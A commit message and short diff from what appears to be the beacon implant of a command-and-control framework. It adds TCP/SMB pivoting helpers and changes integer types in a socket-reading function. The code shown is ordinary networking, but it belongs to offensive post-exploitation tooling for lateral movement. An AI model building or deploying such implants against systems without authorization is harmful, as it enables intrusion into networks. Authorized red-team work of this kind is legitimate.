feat(beacon): add pivot support to C++ beacon agent
- ConnectorTCP: split send/receive, remove aggressive 2.5s post-send poll
- ConnectorTCP: always send 4-byte LE length (including zero-length frames)
- ConnectorSMB: allow zero-length message frames in ReadIncoming
- ConnectorSMB: always write length prefix even for empty payloads
- Pivotter.cpp & utils.cpp: pivot link/unlink/exec helpers
- pl_main.go: handle link errors and differentiate SMB/TCP pivot logging

+++ AdaptixServer/extenders/beacon_agent/src_beacon/beacon/utils.cpp
@@ -203,8 +203,8 @@ BOOL PeekSocketTime(SOCKET sock, int waitTime)
 
 int ReadFromSocket(SOCKET sock, char* buffer, int bufferSize)
 {
-    DWORD recvSize;
-    ULONG dwReaded = 0;
+    int recvSize;
+    int dwReaded = 0;
     if (bufferSize <= 0)
         return dwReaded;
 
@@ -216,7 +216,7 @@ int ReadFromSocket(SOCKET sock, char* buffer, int bufferSize)
         buffer += recvSize;
         dwReaded += recvSize;
 
-        if ((int)dwReaded >= bufferSize)
+        if (dwReaded >= bufferSize)
             return dwReaded;
     }
     ApiWin->shutdown(sock, 2);
